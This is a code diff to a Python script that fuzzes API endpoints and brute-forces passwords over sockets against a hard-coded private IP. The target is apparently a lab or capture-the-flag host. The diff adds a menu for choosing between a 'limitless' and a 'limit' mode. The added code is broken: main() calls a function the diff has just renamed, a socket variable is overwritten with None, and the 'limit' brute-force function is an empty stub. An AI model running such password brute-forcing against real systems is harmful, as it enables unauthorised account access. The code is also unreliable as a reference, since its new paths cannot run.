@@ -5,7 +5,7 @@ endpoints_wordlist = "/home/cccitron/Downloads/API_wordlist"
 #hostname = input("Hostname (IP or hostname): ")
 #port = int(input("Port: "))
 
-hostname = "10.80.166.57"
+hostname = "10.82.143.189"
 port = 8000
 
 # Use this if there's no set ammount of tries!
@@ -31,6 +31,7 @@ def limitless_fuzz_endpoints():
 
 # Use this if there's no set ammount of tries!
 def limitless_brute_force(endpoint):
+    print("IF THERE'S A LIMITED AMMOUNT OF TRIES THE SCRIPT WILL MOST LIKELY FREEZE AND NOT RETURN ANYTHING!")
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client_socket.connect((hostname, port))
 
@@ -49,21 +50,43 @@ def limitless_brute_force(endpoint):
                     print(f"Password is '{password}'")
     except (OSError, ConnectionError) as e:
         print(f"Connection error during brute-force: {e}")
-    # ensure socket is closed if we exhausted the list or an error occurred
     try:
         client_socket.close()
     except Exception:
         pass
     return False
 
-def limit_connect_endpoint():
+def limit_send_password():
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client_socket.connect((hostname, port))
+    client_socket = client_socket.connect((hostname, port))
+
+
+def limit_brute_force():
+    with open(passwords_wordlist, 'rb') as f:
+        passwords = f.read()
+
+    for password in passwords.decode(errors="ignore").splitlines():
+
+        pass
 
 
         
 def main():
-    limitless_fuzz_endpoints()
+    print("There are 2 versions, limitless and limit")
+    print("Use limitless if there's no brute force protection (max ammount of tries)")
+    print("use limit if there's a limit of how much tries you get")
+    while True:
+        version = input("Limitless or Limit: ")
+        if version.lower() == "limitless":
+            limitless_fuzz_endpoints()
+            break
+        elif version.lower() == "limit":
+            limit_connect_endpoint()
+            break
+        else:
+            print("Wrong choice (limitless/limit)")
+            
+            
 
 if __name__ == "__main__":
     main()
